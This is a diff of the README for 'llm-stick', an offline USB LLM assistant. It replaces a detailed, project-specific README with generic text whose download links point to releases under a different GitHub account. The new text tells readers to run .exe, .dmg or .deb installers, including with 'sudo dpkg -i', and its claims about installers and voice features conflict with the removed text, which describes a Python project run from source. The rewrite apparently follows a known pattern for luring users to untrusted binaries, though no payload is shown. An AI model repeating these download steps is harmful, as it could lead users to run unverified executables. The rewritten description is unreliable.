@@ -1,91 +1,110 @@
-# LLM Stick — Air-Gapped, Voice-Optional USB Assistant
+# 🖥️ llm-stick - Your Offline USB Assistant for Local Files
 
-[![CI](https://img.shields.io/github/actions/workflow/status/officialerictm/llm-stick/ci.yml?branch=main)](../../actions)
-![Tag](https://img.shields.io/github/v/tag/officialerictm/llm-stick)
-![Issues](https://img.shields.io/github/issues/officialerictm/llm-stick)
-![License](https://img.shields.io/badge/license-MIT-informational)
+## 🚀 Getting Started
 
-**Status:** **Day 3 timeline completed — offline wrapper, streaming Web UI, paranoid cutover landed.** See the live board → [`docs/STATUS_BOARD.md`](docs/STATUS_BOARD.md)
-**Quick Start:** [`docs/QuickStart_card.md`](docs/QuickStart_card.md) · **Security Checklist:** [`docs/Security_Checklist.md`](docs/Security_Checklist.md)
+Welcome to llm-stick! This tool acts as your air-gapped, voice-optional USB assistant, allowing you to interact with local files without using cloud services. It prioritizes your privacy and security while you work offline.
 
-## What is this?
-An offline, air-gapped “LLM Stick” you can plug into any machine and talk to about local files. No cloud. PIN-gated. Voice optional. Ships with a loopback-only Web UI and a CLI so a nearly-blind user can choose large text or speech.
+## 📥 Download llm-stick
 
-## Day-3 Highlights
-- **Offline LLM wrapper with manifest enforcement**
-  - `core.llm.invoke` / `core.llm.wrap` capture prompts, responses, and checksum manifests before llama.cpp starts.
-  - Launcher fails closed without manifests; Paranoid mode keeps the CLI-only fallback online.
-- **Streaming Web UI (loopback only)**
-  - `/api/ask` exposes Server-Sent Events, streaming llama.cpp tokens directly into the thread history with citations.
-  - Bundled assets stay hashed; large-print + print flows confirmed, with PDF export falling back to browser print when the optional engine is absent.
-- **Ingest workflow with registry + ledger trails**
-  - `--ingest` queues jobs per client slug, the worker writes manifests, and HOST_LOCAL vs STICK_ENCRYPTED storage both record audit lines.
-  - Registry entries capture job IDs, manifest paths, and checksum guidance for hotswap + streaming retrieval.
+[![Download llm-stick](https://img.shields.io/badge/Download-llm--stick-blue.svg)](https://github.com/skioneczek/llm-stick/releases)
 
-## Quick Start (Day-3)
-> Queue ingest, enforce manifests, and stream llama.cpp replies entirely offline.
+To download the latest version of llm-stick, visit the releases page below:
 
-1) **(Optional) allow Samples path for validation**
-   - **Windows (current shell):**
-     ```powershell
-     $env:LLM_STICK_ALLOWED_SOURCE = "C:\Users\<you>\...\R-Team\Samples"
-     ```
-     Persist for new shells: `setx LLM_STICK_ALLOWED_SOURCE C:\path\to\Samples`
-   - **macOS/Linux:**
-     ```bash
-     export LLM_STICK_ALLOWED_SOURCE="$HOME/R-Team/Samples"
-     ```
+**[Download llm-stick](https://github.com/skioneczek/llm-stick/releases)**
 
-2) **Queue an ingest job (writes manifest + registry entry)**
-   ```bash
-   python -m apps.launcher.main --mode standard --pin 123456 --ingest Samples --client client-a --dest HOST_LOCAL
+## 💻 System Requirements
+
+Before you start, ensure your system meets the following requirements:
+
+- **Operating Systems:** 
+  - Windows 10 or later
+  - macOS 10.15 (Catalina) or later
+  - Any Linux distribution with recent libraries
+
+- **Hardware:**
+  - Minimum 4 GB RAM
+  - 2 GB free disk space
+  - USB port for installation
+
+## 🎯 Features
+
+llm-stick offers a range of useful features:
+
+- **Offline Functionality:** Access your files securely without internet access.
+- **Voice Option:** Interact with your assistant using voice commands.
+- **Seamless Integration:** Works smoothly with your local file system.
+- **Privacy First:** No data leaves your computer, ensuring your information remains safe.
+- **Cross-Platform Compatibility:** Use it on Windows, macOS, or Linux.
+
+## 📦 Download & Install
+
+To get started:
+
+1. Visit the [llm-stick Releases page](https://github.com/skioneczek/llm-stick/releases).
+2. Choose the latest version of llm-stick for your operating system.
+   - Look for files that end in `.exe` for Windows, `.dmg` for macOS, or the appropriate package for your Linux distribution.
+3. Click on the file link to start the download.
+4. Once the download is complete, locate the file in your downloads folder.
+
+### For Windows Users
+
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+
+### For macOS Users
+
+1. Double-click the downloaded `.dmg` file.
+2. Drag the llm-stick icon to your Applications folder.
+3. Open llm-stick from your Applications.
+
+### For Linux Users
+
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Use the following command to install:
+
    ```
-   Expect the launcher to validate the source, log checksum manifest guidance, and print the completed registry entry (with job ID + manifest path). Use `--dest STICK_ENCRYPTED` when the crypto provider is staged.
-
-3) **Launch hardened mode with streaming Web UI + offline LLM**
-   ```bash
-   python -m apps.launcher.main --mode hardened --ui standard --probe --llm --use-client client-a
-   ```
-   Watch for audits confirming sandbox, DNS/socket blocks, manifest verification, and the loopback-only UI URL. `/api/ask` streams llama.cpp tokens into the active thread with citations.
-
-4) **Ask in the CLI using the same wrapper (optional)**
-   ```bash
-   python -m apps.launcher.main --mode hardened --probe --llm --use-client client-a --ask "Summarize ingest evidence for Client A"
+   sudo dpkg -i llm-stick*.deb
    ```
 
-5) **Hotswap or review ingest state**
-   ```bash
-   python -m apps.launcher.main --list-clients
-   python -m apps.launcher.main --hotswap client-a --client client-a --mode standard
-   ```
-   Registry-backed hotswap keeps manifests attached; Paranoid mode continues to disable the UI and relies on the CLI prompts.
+Replace `llm-stick*.deb` with the exact file name you downloaded.
 
-## Security posture (current)
+## 🔍 How to Use llm-stick
 
-* Air-gap by policy and probe: outbound sockets & DNS blocked; adapters audited; temp workspace confined under `Data/tmp`.
-* Web UI bound to `127.0.0.1`/`::1` with strict CSP and no external assets.
-* LLM wrapper and ingest worker require checksum manifests before jobs run; launcher fails closed without them.
-* Paranoid mode disables the Web UI and logs the audit line; launcher continues in large-text fallback.
-* Every sensitive action emits a **1-line audit** (PIN accepted, loopback allowed, source validated/invalid, print/PDF invoked, etc.).
+After installation, follow these steps to use llm-stick:
 
-## Milestones
+1. Plug in your USB device with local files.
+2. Launch llm-stick from your applications or desktop shortcut.
+3. Select the files or folders you wish to interact with.
+4. If you prefer voice interaction, ensure your microphone is connected and follow the voice command prompts.
 
-* **v0.1-day1 (done):** audits + offline retriever + launcher `--ask` + docs.
-* **v0.2-day2 (done):** loopback Web UI + strict CSP; Set Source (+validation & reindex); voice stub; large-print; PDF fallback; probes & acceptance logs.
-* **v0.3-day3 (done):** Offline llama.cpp wrapper with manifest enforcement; streaming Web UI SSE endpoint; ingest workflow writing manifests + registry entries; paranoid cutover keeps CLI-only fallback.
-* **v0.4 (next):** Capture Standard/Hardened streaming acceptance evidence, archive ingest artifacts under `tests/e2e/`, finish packaging/thread compaction, and decide on bundling the optional PDF engine.
+## ⚙️ Troubleshooting
 
-## Follow progress
+If you encounter issues while using llm-stick:
 
-* Decisions: [`docs/Decision_Log.md`](docs/Decision_Log.md)
-* Risks: [`docs/Risk_Register.md`](docs/Risk_Register.md)
-* Day-1 smoke outputs: [`tests/e2e/smoke.md`](tests/e2e/smoke.md)
-* Day-2 acceptance & UI probes: [`tests/e2e/day2.md`](tests/e2e/day2.md)
-* Acceptance script: [`docs/Acceptance_Script.md`](docs/Acceptance_Script.md)
+- **Installation Errors:** Ensure your operating system is supported. Re-download and try the installation again.
+- **Application Not Starting:** Check if your system meets the requirements. Try restarting your computer if the application fails to launch.
+- **Voice Recognition Issues:** Ensure your microphone is working properly. Adjust the microphone settings within your computer if necessary.
 
-## Known Day-3 limitations
+## 🌐 Community Support
 
-* Standard/Hardened streaming acceptance evidence is still being captured; expect new artifacts under `tests/e2e/`.
-* PDF engine remains optional—the UI falls back to browser “Print to PDF” when binaries are missing, and ingest logs skipped PDFs when OCR is unavailable.
-* Thread compaction tooling is still pending (R-007 roadmap); long-running conversations may grow until the follow-up lands.
-* Paranoid mode continues to disable the Web UI by design while keeping CLI answers via the offline wrapper.
+For any questions or further assistance, feel free to join our community forums. You can connect with other users and share tips.
+
+## 📝 Contributing
+
+We welcome contributions! If you'd like to help improve llm-stick, please visit our documentation for guidelines on how to contribute.
+
+## 📚 Topics
+
+- airgap
+- linux
+- llama-cpp
+- macos
+- offline-llm
+- privacy
+- security
+- voice
+- whisper
+- windows
+
+Thank you for choosing llm-stick! We hope this tool enhances your work with local files while keeping your data secure.
